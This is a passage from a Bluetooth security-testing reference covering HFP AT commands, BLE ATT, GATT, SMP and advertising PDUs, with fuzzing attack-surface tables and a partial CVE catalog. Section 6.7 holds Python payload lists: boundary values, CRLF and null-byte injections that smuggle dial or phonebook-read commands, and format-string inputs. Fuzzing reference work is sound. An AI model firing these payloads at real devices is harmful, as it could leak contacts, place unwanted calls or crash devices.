|---------|-------------|---------|
| `AT+CPBS=<storage>` | Select phonebook memory | `AT+CPBS="ME"` |
| `AT+CPBS?` | Query current storage | Response: `+CPBS:"ME",150,500` |
| `AT+CPBR=<start>,<end>` | Read entries in range | `AT+CPBR=1,200` |
| `AT+CPBF="<text>"` | Find entries matching text | `AT+CPBF="John"` |
| `AT+CPBW=<idx>,<num>,<type>,<name>` | Write entry | `AT+CPBW=1,"+1234",145,"Test"` |

**Memory storage codes**: ME (phone), SM (SIM), DC (dialed), RC (received), MC (missed), FD (fixed dialing), ON (own numbers), EN (emergency), LD (last dial).

### 6.5 SMS AT Commands (3GPP TS 27.005)

| Command | Description | Example |
|---------|-------------|---------|
| `AT+CMGF=<0/1>` | Format: 0=PDU, 1=text | `AT+CMGF=1` |
| `AT+CMGL="<stat>"` | List messages | `AT+CMGL="ALL"` or `AT+CMGL=4` |
| `AT+CMGR=<index>` | Read message | `AT+CMGR=1` |
| `AT+CMGS="<number>"` | Send (followed by text + Ctrl-Z) | `AT+CMGS="+1234567890"` |
| `AT+CMGD=<index>,<delflag>` | Delete message | `AT+CMGD=1,0` |
| `AT+CNMI=<mode>,<mt>,<bm>,<ds>,<bfr>` | New message indications | `AT+CNMI=2,1,0,0,0` |

**Device Info:**

| Command | Description |
|---------|-------------|
| `AT+CGSN` | IMEI |
| `AT+CIMI` | IMSI |
| `AT+CSQ` | Signal quality |
| `AT+CBC` | Battery charge |
| `AT+CGMI` | Manufacturer |
| `AT+CGMM` | Model |
| `AT+CGMR` | Revision |

### 6.6 AT Syntax Rules

- **Termination**: `\r` (`0x0D`). Responses wrapped in `\r\n`.
- **Response format**: `<CR><LF><response><CR><LF>`. Response is `OK`, `ERROR`, `+CME ERROR: <code>`, `+CMS ERROR: <code>`, or information response.
- **Max length**: ITU-T V.250 specifies 2048 chars after `AT`. Many HFP implementations use 256-byte buffer.
- **`A/` repetition**: Re-executes last command. No `AT` prefix, no `\r` terminator needed.
- **Concatenation**: `AT+VGS=15;+VGM=15\r` -- semicolon separates within one line.
- **S-registers**: `ATS<n>=<value>` sets, `ATS<n>?` reads.

### 6.7 Fuzzing Corpus Generator Patterns

**A. Boundary Values per HFP Verb:**

```python
AT_FUZZ_PAYLOADS = {
    "brsf_overflow": [
        "AT+BRSF=4294967295\r",       # uint32 max
        "AT+BRSF=99999999999999\r",    # exceeds 32-bit
        "AT+BRSF=-1\r",               # negative
        "AT+BRSF=0.5\r",              # float
        "AT+BRSF=\r",                 # empty
        "AT+BRSF=0x7FFFFFFF\r",       # hex string (parser confusion)
    ],
    "volume_overflow": [
        "AT+VGS=999\r",
        "AT+VGS=-1\r",
        "AT+VGS=16\r",                # just above max (15)
        "AT+VGM=65535\r",
        "AT+VGM=\r",
    ],
    "chld_fuzz": [
        "AT+CHLD=99\r",
        "AT+CHLD=-1\r",
        "AT+CHLD=1999\r",             # index overflow
        "AT+CHLD=2147483647\r",
        "AT+CHLD=\r",
    ],
    "dial_fuzz": [
        "ATD" + "1" * 1024 + ";\r",   # 1024-digit number
        "ATD" + "+" * 256 + "\r",      # repeated plus
        "ATD;\r",                       # empty dial
        "ATD" + "\x00" * 100 + ";\r",  # null bytes in number
        "ATD>SM999999;\r",              # memory dial overflow
    ],
    "phonebook_fuzz": [
        "AT+CPBR=0,999999\r",
        "AT+CPBR=-1,1\r",
        "AT+CPBR=1,0\r",              # inverted range
        'AT+CPBS="' + "X" * 256 + '"\r',
        'AT+CPBW=999999,"+1",145,"' + "A" * 512 + '"\r',
        'AT+CPBF="' + "%" * 256 + '"\r',  # format string in search
    ],
    "codec_fuzz": [
        "AT+BAC=0\r",                  # invalid codec
        "AT+BAC=255\r",
        "AT+BAC=1,2,3,4,5,6,7,8,9\r", # too many codecs
        "AT+BCS=999\r",
    ],
    "dtmf_fuzz": [
        "AT+VTS=\r",
        "AT+VTS=ZZ\r",
        "AT+VTS=" + "0" * 256 + "\r",
        "AT+VTS=\x00\r",
    ],
    "bind_fuzz": [
        "AT+BIND=999999\r",
        "AT+BIND=-1\r",
        "AT+BIND=1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\r",
    ],
}
```

**B. Injection and Encoding Attacks:**

```python
AT_INJECTION_PAYLOADS = [
    # CRLF injection
    "AT+CIND?\r\nAT+CPBR=1,999\r",
    "AT+VGS=5\r\r\nATD+11234567890;\r",
    # Null byte injection
    "AT+BRSF=\x00127\r",
    "AT\x00+CPBR=1,100\r",
    # Non-ASCII / encoding attacks
    "AT+CPBF=\"\xff\xfe\xfd\"\r",
    "AT+CPBW=1,\"+1\",145,\"\xc0\xc1\xc2\"\r",
    # Format string attempts
    "AT+CIND%n%n%n%n\r",
    "AT+CPBF=\"%s%s%s%s%s\"\r",
    "AT+VGS=%x%x%x%x\r",
    # Command concatenation abuse
    "AT+VGS=5;+CPBR=1,999\r",
    "AT+VGS=5;D+11234567890;\r",
    # A/ repetition flood
    "A/",
    # S-register manipulation
    "ATS0=1\r",   # auto-answer
    "ATS2=43\r",  # change escape char
    "ATS12=0\r",  # DTMF duration to 0
]
```

**C. SMS-Specific Fuzzing:**

```python
SMS_FUZZ_PAYLOADS = [
    "AT+CMGF=0\r",  # PDU mode
    "AT+CMGS=9999\r\x00\x00\x00\x00\x1a",  # oversized PDU + Ctrl-Z
    "AT+CMGF=1\r",  # text mode
    'AT+CMGS="+1"\r' + "A" * 4096 + "\x1a",  # 4KB body
    "AT+CMGL=99\r",
    'AT+CMGL="INVALID"\r',
    "AT+CNMI=9,9,9,9,9\r",
]
```

---

## 7. BLE ATT (Attribute Protocol)

ATT is carried over L2CAP CID `0x0004` (LE) or `0x0005` (BR/EDR). All multi-byte fields are **little-endian** except application-defined Attribute Value fields. Default ATT_MTU = 23 bytes (minimum), negotiable up to 517.

### 7.1 PDU Format

**Opcode Byte Structure:**

```
Bit 7:    Authentication Signature Flag (1 = 12-byte signature appended)
Bit 6:    Command Flag (1 = command, no response expected)
Bits 5-0: Method (6-bit identifier)
```

When Auth Signature Flag = 1, a 12-byte signature is appended. Max payload = ATT_MTU - 1 (opcode) - 12 (if signed).

**Complete Opcode Table:**

| Opcode | Name | Direction | Fields (after opcode) | struct Hint |
|--------|------|-----------|----------------------|-------------|
| `0x01` | Error Response | Srv->Cli | ReqOpcodeInError(1) + AttrHandle(2 LE) + ErrorCode(1) | `<BHB` |
| `0x02` | Exchange MTU Request | Cli->Srv | ClientRxMTU(2 LE) | `<H` |
| `0x03` | Exchange MTU Response | Srv->Cli | ServerRxMTU(2 LE) | `<H` |
| `0x04` | Find Information Request | Cli->Srv | StartHandle(2) + EndHandle(2) | `<HH` |
| `0x05` | Find Information Response | Srv->Cli | Format(1) + InfoData(var) | |
| `0x06` | Find By Type Value Request | Cli->Srv | StartHandle(2) + EndHandle(2) + AttrType(2) + AttrValue(var) | `<HHH` + val |
| `0x07` | Find By Type Value Response | Srv->Cli | HandlesInfoList(var: FoundHandle(2)+GroupEndHandle(2) pairs) | |
| `0x08` | Read By Type Request | Cli->Srv | StartHandle(2) + EndHandle(2) + AttrType(2 or 16) | `<HH` + uuid |
| `0x09` | Read By Type Response | Srv->Cli | Length(1) + AttrDataList(var) | |
| `0x0A` | Read Request | Cli->Srv | AttrHandle(2) | `<H` |
| `0x0B` | Read Response | Srv->Cli | AttrValue(var, up to ATT_MTU-1) | |
| `0x0C` | Read Blob Request | Cli->Srv | AttrHandle(2) + ValueOffset(2) | `<HH` |
| `0x0D` | Read Blob Response | Srv->Cli | PartAttrValue(var) | |
| `0x0E` | Read Multiple Request | Cli->Srv | SetOfHandles(var: 2B each, min 2) | |
| `0x0F` | Read Multiple Response | Srv->Cli | SetOfValues(var) | |
| `0x10` | Read By Group Type Request | Cli->Srv | StartHandle(2) + EndHandle(2) + AttrGroupType(2 or 16) | |
| `0x11` | Read By Group Type Response | Srv->Cli | Length(1) + AttrDataList(var) | |
| `0x12` | Write Request | Cli->Srv | AttrHandle(2) + AttrValue(var, up to ATT_MTU-3) | |
| `0x13` | Write Response | Srv->Cli | (empty) | |
| `0x16` | Prepare Write Request | Cli->Srv | AttrHandle(2) + ValueOffset(2) + PartAttrValue(var) | |
| `0x17` | Prepare Write Response | Srv->Cli | AttrHandle(2) + ValueOffset(2) + PartAttrValue(var) | |
| `0x18` | Execute Write Request | Cli->Srv | Flags(1): 0x00=cancel, 0x01=write | |
| `0x19` | Execute Write Response | Srv->Cli | (empty) | |
| `0x1B` | Handle Value Notification | Srv->Cli | AttrHandle(2) + AttrValue(var) | |
| `0x1D` | Handle Value Indication | Srv->Cli | AttrHandle(2) + AttrValue(var) | |
| `0x1E` | Handle Value Confirmation | Cli->Srv | (empty) | |
| `0x52` | Write Command | Cli->Srv | AttrHandle(2) + AttrValue(var) | |
| `0xD2` | Signed Write Command | Cli->Srv | AttrHandle(2) + AttrValue(var) + AuthSignature(12) | |

Opcode bit decomposition:
- `0x52` = `0b01010010` => Command=1, AuthSig=0, Method=0x12 (Write)
- `0xD2` = `0b11010010` => Command=1, AuthSig=1, Method=0x12 (Write)

**Find Information Response Format:**
- Format=0x01: UUID 16-bit. Each entry: Handle(2) + UUID(2) = 4 bytes
- Format=0x02: UUID 128-bit. Each entry: Handle(2) + UUID(16) = 18 bytes

**Read By Type / Read By Group Type Response:**
- Length byte = size of each entry
- Read By Type: entry = Handle(2) + Value(Length-2)
- Read By Group Type: entry = AttrHandle(2) + EndGroupHandle(2) + Value(Length-4)

### 7.2 Error Codes

| Value | Name | Description |
|-------|------|-------------|
| `0x01` | Invalid Handle | Handle outside valid range |
| `0x02` | Read Not Permitted | Cannot be read |
| `0x03` | Write Not Permitted | Cannot be written |
| `0x04` | Invalid PDU | ATT PDU is invalid |
| `0x05` | Insufficient Authentication | Auth required |
| `0x06` | Request Not Supported | Server doesn't support |
| `0x07` | Invalid Offset | Offset past end of value |
| `0x08` | Insufficient Authorization | Authz required |
| `0x09` | Prepare Queue Full | Too many queued writes |
| `0x0A` | Attribute Not Found | Not found in range |
| `0x0B` | Attribute Not Long | Can't use Read Blob |
| `0x0C` | Insufficient Encryption Key Size | Key too short |
| `0x0D` | Invalid Attribute Value Length | Wrong length |
| `0x0E` | Unlikely Error | Unlikely error |
| `0x0F` | Insufficient Encryption | Encryption required |
| `0x10` | Unsupported Group Type | Invalid group type |
| `0x11` | Insufficient Resources | Resources exhausted |
| `0x12` | Database Out of Sync | (BT 5.1+) Hash mismatch |
| `0x13` | Value Not Allowed | (BT 5.1+) Value not allowed |
| `0x80`-`0x9F` | Application Error | App-defined |
| `0xE0`-`0xFF` | Common Profile/Service Error | Profile-defined |
| `0xFC` | Write Request Rejected | |
| `0xFD` | CCC Improper Configuration | CCCD improperly configured |
| `0xFE` | Procedure Already in Progress | |
| `0xFF` | Out of Range | |

### 7.3 Hex Examples

**Exchange MTU (client wants 256):**
```
TX: 02 00 01        # Opcode 0x02, ClientRxMTU=256 (0x0100 LE)
RX: 03 00 01        # Opcode 0x03, ServerRxMTU=256
```

**Discover primary services (handles 0x0001-0xFFFF):**
```
TX: 10 01 00 FF FF 00 28
         ^^^^^ Start=0x0001  ^^^^^ End=0xFFFF  ^^^^^ Type=0x2800 (Primary Service)

RX: 11 06 01 00 05 00 0D 18 06 00 09 00 0F 18
      ^^ Len=6 (handle+endgroup+uuid16 = 2+2+2)
              ^^^^^ Handle=0x0001  ^^^^^ EndGrp=0x0005  ^^^^^ UUID=0x180D (Heart Rate)
                                         ^^^^^ Handle=0x0006  ^^^^^ EndGrp=0x0009
                                                                     ^^^^^ UUID=0x180F (Battery)
```

**Discover characteristics (handles 0x0001-0x0005):**
```
TX: 08 01 00 05 00 03 28       # ReadByType, Type=0x2803 (Characteristic)
RX: 09 07 02 00 10 03 00 37 2A # Len=7: Handle=0x0002, Props=0x10(Notify),
                                #         ValHandle=0x0003, UUID=0x2A37(HR Measurement)
```

**Write CCCD (enable notifications on handle 0x0004):**
```
TX: 12 04 00 01 00              # Write Request, Handle=0x0004, Value=0x0001
RX: 13                          # Write Response (empty)
```

**Notification (heart rate = 72):**
```
RX: 1B 03 00 00 48             # Notification, Handle=0x0003, Flags=0x00, HR=72
```

**Error (read non-existent handle):**
```
TX: 0A FF FF                   # Read Request, Handle=0xFFFF
RX: 01 0A FF FF 01             # Error: ReqOpcode=0x0A, Handle=0xFFFF, Code=0x01(Invalid Handle)
```

**Prepare Write + Execute Write:**
```
TX: 16 10 00 00 00 48 65 6C 6C 6F   # PrepareWrite Handle=0x0010, Offset=0, "Hello"
RX: 17 10 00 00 00 48 65 6C 6C 6F   # PrepareWrite Response (echo)
TX: 18 01                             # ExecuteWrite Flags=0x01 (commit)
RX: 19                                # ExecuteWrite Response
```

### 7.4 Fuzzing Attack Surface

| Attack Vector | PDU | Details | Expected |
|---|---|---|---|
| Handle `0x0000` | Read(`0x0A`), Write(`0x12`) | Handle=`00 00` | Error `0x01` |
| Handle `0xFFFF` | Any handle-based | Handle=`FF FF` | Error `0x01` if no attr |
| Start > End | FindInfo(`0x04`), ReadByType(`0x08`) | Start=`05 00`, End=`01 00` | Error `0x01` |
| Start = `0x0000` | FindInfo, ReadByType | Start=`00 00` | Error `0x01` |
| Read Blob beyond length | ReadBlob(`0x0C`) | Offset past value end | Error `0x07` |
| Read Blob short attr | ReadBlob(`0x0C`) | Value <= MTU-1 | Error `0x0B` |
| Write to read-only | Write(`0x12`) | Read-only handle | Error `0x03` |
| Oversized write | Write(`0x12`) | Value > ATT_MTU-3 | Reject/truncate |
| PDU > MTU | Any | Total > negotiated MTU | Disconnect |
| Multiple pending requests | Read + Read | Send 2nd before 1st response | Crash/deadlock (SweynTooth) |
| Unknown opcodes | N/A | `0x14`, `0x15`, `0x1A`, `0x1C`, `0x1F`-`0x51` | Error `0x06` |
| Invalid UUID size | ReadByType(`0x08`) | UUID=4 bytes (not 2/16) | Error `0x04` |
| Zero-length write | Write(`0x12`), PrepareWrite(`0x16`) | Empty value | Stack-dependent |
| PrepareWrite offset overflow | PrepareWrite(`0x16`) | Offset=`0xFFFF` + large value | Heap overflow (CVE-2024-24746) |
| Execute without Prepare | ExecuteWrite(`0x18`) | Flags=`0x01`, no queued writes | No-op |
| ReadMultiple 1 handle | ReadMultiple(`0x0E`) | Only 1 handle (min 2 required) | Error `0x04` |
| Bad signed write | SignedWrite(`0xD2`) | 12 bytes random signature | Auth failure |
| Client sends Notification | Notification(`0x1B`) | Sent client->server | Ignored/disconnect |
| MTU=0xFFFF | ExchangeMTU(`0x02`) | ClientRxMTU=65535 | Allocation crash (SweynTooth) |

---

## 8. BLE GATT (Generic Attribute Profile)

GATT defines the attribute database structure on top of ATT.

### 8.1 Service/Characteristic/Descriptor Structure

**Service Declaration:**
- Type UUID: `0x2800` (Primary) or `0x2801` (Secondary)
- Permissions: Read Only
- Value: Service UUID (2 bytes for SIG-assigned, 16 for vendor)

**Characteristic Declaration:**
- Type UUID: `0x2803`
- Permissions: Read Only
- Value layout (5 or 19 bytes):

```
Byte 0:      Properties (1 byte, bitfield)
Bytes 1-2:   Characteristic Value Handle (2 bytes LE)
Bytes 3-4:   Characteristic UUID (2 bytes for UUID16)
  -- OR --
Bytes 3-18:  Characteristic UUID (16 bytes for UUID128)
```

**Characteristic Value:**
- Type: UUID from the declaration
- Handle: Referenced in declaration value
- Max value length: 512 bytes

**Common GATT Service UUIDs:**

| UUID16 | Service |
|--------|---------|
| `0x1800` | Generic Access |
| `0x1801` | Generic Attribute |
| `0x180A` | Device Information |
| `0x180D` | Heart Rate |
| `0x180F` | Battery Service |
| `0x1810` | Blood Pressure |
| `0x1812` | HID |
| `0x1816` | Cycling Speed and Cadence |

### 8.2 CCCD and Properties

**Characteristic Properties Byte:**

| Bit | Mask | Property |
|-----|------|----------|
| 0 | `0x01` | Broadcast |
| 1 | `0x02` | Read |
| 2 | `0x04` | Write Without Response |
| 3 | `0x08` | Write (with response) |
| 4 | `0x10` | Notify |
| 5 | `0x20` | Indicate |
| 6 | `0x40` | Authenticated Signed Writes |
| 7 | `0x80` | Extended Properties |

Common combos: `0x02`=Read, `0x0A`=Read+Write, `0x12`=Read+Notify, `0x1A`=Read+Write+Notify

**CCCD (Client Characteristic Configuration Descriptor) - UUID `0x2902`:**

```
Value: 2 bytes, little-endian
  Bit 0 (0x0001): Notifications enabled
  Bit 1 (0x0002): Indications enabled
  Bits 2-15:      Reserved (must be 0)
```

Permissions: Read + Write. Each connected client has its own CCCD value.

**Other Descriptors:**

| UUID | Name | Value |
|------|------|-------|
| `0x2900` | Characteristic Extended Properties | 2 bytes: Bit 0=Reliable Write, Bit 1=Writable Aux |
| `0x2901` | Characteristic User Description | UTF-8 string |
| `0x2904` | Characteristic Presentation Format | Format(1)+Exponent(1)+Unit(2)+Namespace(1)+Description(2) = 7 bytes |
| `0x2905` | Characteristic Aggregate Format | List of Presentation Format handles |

**Handle Space Layout Example:**

```
Handle  Type    Description
------  ------  -----------
0x0001  0x2800  Primary Service: Heart Rate (0x180D)
0x0002  0x2803  Char Decl: Props=0x10, ValHandle=0x0003, UUID=0x2A37
0x0003  0x2A37  Char Value: Heart Rate Measurement
0x0004  0x2902  CCCD for Heart Rate Measurement
0x0005  0x2803  Char Decl: Props=0x02, ValHandle=0x0006, UUID=0x2A38
0x0006  0x2A38  Char Value: Body Sensor Location
0x0007  0x2800  Primary Service: Battery (0x180F)
0x0008  0x2803  Char Decl: Props=0x12, ValHandle=0x0009, UUID=0x2A19
0x0009  0x2A19  Char Value: Battery Level
0x000A  0x2902  CCCD for Battery Level
```

### 8.3 Fuzzing Attack Surface

| Attack | Method | Details |
|--------|--------|---------|
| Write `0x0000` to CCCD | Write(`0x12`) | Disable notifications (edge case) |
| Write `0x0003`+ to CCCD | Write(`0x12`) | Both notify+indicate, or `0xFFFF` reserved bits |
| Subscribe non-notifiable | Write `0x0001` to CCCD of char with Properties bit 4=0 | Error `0xFD` |
| Indicate non-indicatable | Write `0x0002` to CCCD of char with Properties bit 5=0 | Error `0xFD` |
| Write service declaration | Write(`0x12`) to `0x2800`/`0x2801` handle | Error `0x03` |
| Write char declaration | Write(`0x12`) to `0x2803` handle | Error `0x03` |
| Read across service boundary | ReadByType spanning multiple services | Should limit to one |
| Invalid group type | ReadByGroupType with UUID != `0x2800`/`0x2801` | Error `0x10` |

---

## 9. BLE SMP (Security Manager Protocol)

SMP runs on L2CAP CID `0x0006` (LE) or `0x0007` (BR/EDR). All fields **little-endian**. Maximum PDU: 65 bytes (Pairing Public Key).

### 9.1 Command Table

| Code | Name | Data Fields | Total Size |
|------|------|-------------|------------|
| `0x01` | Pairing Request | IOCap(1)+OOB(1)+AuthReq(1)+MaxKeySize(1)+InitKeyDist(1)+RespKeyDist(1) | 7 |
| `0x02` | Pairing Response | IOCap(1)+OOB(1)+AuthReq(1)+MaxKeySize(1)+InitKeyDist(1)+RespKeyDist(1) | 7 |
| `0x03` | Pairing Confirm | ConfirmValue(16) | 17 |
| `0x04` | Pairing Random | RandomValue(16) | 17 |
| `0x05` | Pairing Failed | Reason(1) | 2 |
| `0x06` | Encryption Information | LTK(16) | 17 |
| `0x07` | Central Identification | EDIV(2)+Rand(8) | 11 |
| `0x08` | Identity Information | IRK(16) | 17 |
| `0x09` | Identity Address Info | AddrType(1)+BD_ADDR(6) | 8 |
| `0x0A` | Signing Information | CSRK(16) | 17 |
| `0x0B` | Security Request | AuthReq(1) | 2 |
| `0x0C` | Pairing Public Key | PublicKey_X(32)+PublicKey_Y(32) | 65 |
| `0x0D` | Pairing DHKey Check | DHKeyCheck(16) | 17 |
| `0x0E` | Keypress Notification | NotificationType(1) | 2 |

**Pairing Failed Reason Codes:**

| Value | Name |
|-------|------|
| `0x01` | Passkey Entry Failed |
| `0x02` | OOB Not Available |
| `0x03` | Authentication Requirements |
| `0x04` | Confirm Value Failed |
| `0x05` | Pairing Not Supported |
| `0x06` | Encryption Key Size |
| `0x07` | Command Not Supported |
| `0x08` | Unspecified Reason |
| `0x09` | Repeated Attempts |
| `0x0A` | Invalid Parameters |
| `0x0B` | DHKey Check Failed |
| `0x0C` | Numeric Comparison Failed |
| `0x0D` | BR/EDR Pairing In Progress |
| `0x0E` | CT Key Derivation Not Allowed |

### 9.2 IO Capabilities and AuthReq

**IO Capabilities:**

| Value | Name | Input | Output |
|-------|------|-------|--------|
| `0x00` | DisplayOnly | No | Numeric display |
| `0x01` | DisplayYesNo | Yes/No buttons | Numeric display |
| `0x02` | KeyboardOnly | Keyboard | No |
| `0x03` | NoInputNoOutput | No | No |
| `0x04` | KeyboardDisplay | Keyboard | Numeric display |

Values `0x05`-`0xFF` reserved -- fuzzing targets.

**AuthReq Byte (Bit Field):**

```
Bits 0-1: Bonding Flags (00=No Bonding, 01=Bonding, 10-11=Reserved)
Bit 2:    MITM (0=No, 1=Required)
Bit 3:    SC (0=Legacy, 1=Secure Connections)
Bit 4:    Keypress (0=Not supported, 1=Supported)
Bit 5:    CT2 (Cross-Transport Key Derivation, BT 5.0+)
Bits 6-7: Reserved (must be 0)
```

Common values: `0x00`=No bonding legacy, `0x01`=Bonding legacy, `0x05`=Bonding+MITM legacy, `0x09`=Bonding+SC, `0x0D`=Bonding+MITM+SC, `0x1D`=Bonding+MITM+SC+Keypress

**Key Distribution Byte:**

```
Bit 0 (0x01): EncKey   -- LTK + EDIV + Rand
Bit 1 (0x02): IdKey    -- IRK + BD_ADDR
Bit 2 (0x04): SignKey  -- CSRK
Bit 3 (0x08): LinkKey  -- BR/EDR Link Key (SC only)
Bits 4-7:     Reserved
```

**OOB Data Flag:** `0x00`=not present, `0x01`=present. Values `0x02`-`0xFF` reserved.

**Keypress Notification Types:** `0x00`=started, `0x01`=digit entered, `0x02`=digit erased, `0x03`=cleared, `0x04`=completed.

### 9.3 Legacy vs Secure Connections

**LE Legacy Pairing (AuthReq.SC = 0):**
- Phase 1: Feature Exchange (Pairing Req/Rsp)
- Phase 2: STK Generation using TK
  - Just Works: TK = 0
  - Passkey Entry: TK = 6-digit passkey (zero-padded to 128 bits)
  - OOB: TK = 128-bit OOB value
  - Confirm/Random exchange (`0x03`/`0x04`)
- Phase 3: Key Distribution (`0x06`-`0x0A`)
- **Vulnerability**: TK is at most 20 bits (passkey) or 0 (Just Works), brute-forceable

**LE Secure Connections (AuthReq.SC = 1):**
- Phase 1: Feature Exchange (both must set SC=1)
- Phase 2: ECDH Key Agreement
  - Public Key exchange (`0x0C`): 64-byte P-256 keys
  - Just Works / Numeric Comparison: f4 commitment + compare 6-digit value
  - Passkey Entry: 20 rounds of f4 (one per passkey bit)
  - OOB: f4 with OOB random+confirm
  - DHKey Check (`0x0D`): f6 validates
- Phase 3: Key Distribution (only IdKey/SignKey; LTK from ECDH)
- **Security**: 128-bit ECDH, resistant to passive eavesdropping

**Hex Example (LE Legacy Just Works):**

```
# Pairing Request (Initiator -> Responder)
TX: 01 03 00 01 10 07 07
     ^^ Code=0x01  ^^ IOCap=NoInputNoOutput  ^^ OOB=No  ^^ AuthReq=Bonding
        ^^ MaxKeySize=16  ^^ InitKeyDist=EncKey+IdKey+SignKey  ^^ RespKeyDist=same

# Pairing Response
RX: 02 03 00 01 10 07 07

# Pairing Confirm (Initiator)
TX: 03 <16 bytes confirm_value>

# Pairing Confirm (Responder)
RX: 03 <16 bytes confirm_value>

# Pairing Random (Initiator)
TX: 04 <16 bytes random>

# Pairing Random (Responder)
RX: 04 <16 bytes random>

# [STK computed, encryption starts via LL_ENC_REQ/RSP]

# Key Distribution: Encryption Information
RX: 06 <16 bytes LTK>

# Key Distribution: Central Identification
RX: 07 <2 bytes EDIV> <8 bytes Rand>
```

### 9.4 Fuzzing Attack Surface

| Attack | Command | Details | Impact |
|--------|---------|---------|--------|
| MaxKeySize < 7 | PairingReq(`0x01`) | MaxKeySize=`0x01`-`0x06` | Must reject error `0x06` |
| MaxKeySize > 16 | PairingReq(`0x01`) | MaxKeySize=`0x11`+ | Must reject `0x0A` |
| MaxKeySize = 0 | PairingReq(`0x01`) | MaxKeySize=`0x00` | Must reject |
| IOCap > `0x04` | PairingReq(`0x01`) | IOCap=`0x05`-`0xFF` | Should reject `0x0A` |
| Out-of-sequence | Any | Confirm before Response | Should reject `0x08` |
| Failed then continue | Failed(`0x05`) + Confirm(`0x03`) | State confusion | Crash |
| Invalid ECDH key | PublicKey(`0x0C`) | Point not on P-256 | CVE-2018-5383: must validate |
| Zero public key | PublicKey(`0x0C`) | All 64 bytes = `0x00` | Not valid point; must reject |
| Key = generator | PublicKey(`0x0C`) | X,Y = known G | Shared secret = private key |
| Rapid pairing | PairingReq(`0x01`) flood | DoS | Should rate-limit (`0x09`) |
| Reserved AuthReq bits | PairingReq(`0x01`) | AuthReq=`0xFF` | Must ignore reserved |
| Reserved OOB values | PairingReq(`0x01`) | OOB=`0x02`-`0xFF` | Must reject/ignore |
| Keypress without SC | PairingReq(`0x01`) | Keypress=1, SC=0 | Invalid combo |
| Security Req as central | SecurityReq(`0x0B`) | Central sends peripheral cmd | Should ignore |
| Oversized SMP PDU | Any | PDU larger than expected | Buffer overflow |
| KNOB variant | PairingReq/Rsp | Both: MaxKeySize=7 | Spec-compliant but weak |

---

## 10. BLE Advertising

### 10.1 PDU Types

Advertising PDUs are at the Link Layer level. Crafting them requires raw HCI access (`hcitool`, `btmgmt`, or raw HCI sockets).

| PDU Type | Name | Connectable | Scannable | Directed | Payload |
|----------|------|-------------|-----------|----------|---------|
| `0x00` | ADV_IND | Yes | Yes | No | AdvA(6) + AdvData(0-31) |
| `0x01` | ADV_DIRECT_IND | Yes | No | Yes | AdvA(6) + TargetA(6) |
| `0x02` | ADV_NONCONN_IND | No | No | No | AdvA(6) + AdvData(0-31) |
| `0x03` | SCAN_REQ | -- | -- | -- | ScanA(6) + AdvA(6) |
| `0x04` | SCAN_RSP | -- | Yes | -- | AdvA(6) + ScanRspData(0-31) |
| `0x05` | CONNECT_IND | -- | -- | -- | InitA(6) + AdvA(6) + LLData(22) |
| `0x06` | ADV_SCAN_IND | No | Yes | No | AdvA(6) + AdvData(0-31) |

BT 5.0+ adds Extended Advertising (ADV_EXT_IND = `0x07`) with AuxPtr chaining.

### 10.2 AD Structure Format

AdvData and ScanRspData contain zero or more AD structures:

```
+----------+----------+------------------+
| Length(1) | AD_Type(1) | AD_Data(Length-1) |
+----------+----------+------------------+
```

- **Length**: Bytes that follow (AD_Type + AD_Data), NOT including itself
- Total AdvData: max 31 bytes (legacy), 254 per fragment (extended)

**Common AD Types:**

| Value | Name | Data Format |
|-------|------|-------------|
| `0x01` | Flags | 1 byte bitfield |
| `0x02` | Incomplete List 16-bit UUIDs | 2 bytes per UUID LE |
| `0x03` | Complete List 16-bit UUIDs | 2 bytes per UUID LE |
| `0x04` | Incomplete List 32-bit UUIDs | 4 bytes per UUID |
| `0x05` | Complete List 32-bit UUIDs | 4 bytes per UUID |
| `0x06` | Incomplete List 128-bit UUIDs | 16 bytes per UUID |
| `0x07` | Complete List 128-bit UUIDs | 16 bytes per UUID |
| `0x08` | Shortened Local Name | UTF-8 |
| `0x09` | Complete Local Name | UTF-8 |
| `0x0A` | TX Power Level | 1 signed byte (dBm) |
| `0x0D` | Class of Device | 3 bytes |
| `0x10` | Service Data - 16-bit UUID | UUID(2) + Data(var) |
| `0x12` | Peripheral Conn Interval Range | Min(2) + Max(2), units 1.25ms |
| `0x14` | List 16-bit Solicitation UUIDs | 2 bytes per UUID |
| `0x16` | Service Data - 16-bit UUID | UUID(2) + Data(var) |
| `0x19` | Appearance | 2 bytes LE |
| `0x1B` | LE Device Address | Address(6) + Type(1) |
| `0x20` | Service Data - 32-bit UUID | UUID(4) + Data(var) |
| `0x21` | Service Data - 128-bit UUID | UUID(16) + Data(var) |
| `0xFF` | Manufacturer Specific | CompanyID(2) + Data(var) |

**Flags AD Type (`0x01`) Bits:**

```
Bit 0: LE Limited Discoverable
Bit 1: LE General Discoverable
Bit 2: BR/EDR Not Supported
Bit 3: Simultaneous LE+BR/EDR (Controller)
Bit 4: Simultaneous LE+BR/EDR (Host)
Bits 5-7: Reserved
```

Common: `0x06`=General Discoverable+BR/EDR Not Supported, `0x02`=General Discoverable, `0x04`=BR/EDR Not Supported.

**Hex Example:**
```
02 01 06                         # Flags: Len=2, Type=0x01, Value=0x06
11 07 FB 34 9B 5F 80 00 00 80   # 128-bit UUID: Len=17, Type=0x07, 16-byte UUID
   00 10 00 00 00 00 00 00
0B 09 4D 79 44 65 76 69 63 65   # Complete Name: Len=11, Type=0x09, "MyDevice\0"
   00
```

### 10.3 Fuzzing Attack Surface

| Attack | Details | Requires |
|--------|---------|----------|
| AD Length > 31 bytes total | Overflow legacy 31-byte limit | Raw HCI |
| AD entry Length > remaining | Declared length exceeds packet | Raw HCI |
| AD entry Length = 0 | Zero-length entry | Raw HCI |
| Unknown AD Types | All 256 values | Raw HCI |
| Malformed UUID lists | Odd byte count for 16-bit UUID list | Raw HCI |
| Oversized Local Name | Name > 31 bytes in legacy advertising | Raw HCI |
| Invalid Flags bits | All reserved bits set (`0xFF`) | Raw HCI |
| Manufacturer data overflow | CompanyID + huge payload | Raw HCI |
| Rapid advertising changes | Toggle advertising data at max rate | Raw HCI |
| CONNECT_IND with invalid LLData | Bad window/interval/timeout | Raw HCI/SDR |

---

## 11. Known Vulnerability Patterns

### 11.1 CVE Catalog

| CVE / Name | Year | Layer | Root Cause | User-Space Testable? | Protocol Field |
|------------|------|-------|-----------|---------------------|----------------|
| **BlueBorne** CVE-2017-0785 | 2017 | SDP | Continuation state used as raw memory offset without bounds check | **Yes** -- L2CAP PSM 1 | SDP ContinuationState bytes |
